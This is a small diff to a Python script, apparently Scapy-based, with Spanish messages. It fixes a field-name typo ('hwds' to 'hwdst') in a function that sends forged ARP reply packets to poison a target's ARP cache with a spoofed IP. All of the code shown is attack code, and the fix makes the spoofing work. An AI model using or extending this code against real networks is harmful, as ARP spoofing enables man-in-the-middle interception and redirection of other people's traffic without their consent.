@@ -4,7 +4,7 @@ import sys
 
 def arp_spoofing(targetIP, targetMAC, spoofIP):
     print(f"Enviando un paquete ARP a {targetIP}")
-    paquete = ARP(op=2, pdst=targetIP, hwds=targetMAC, psrc=spoofIP)
+    paquete = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
     send(paquete, verbose=False)
 
 if __name__ == "__main__":
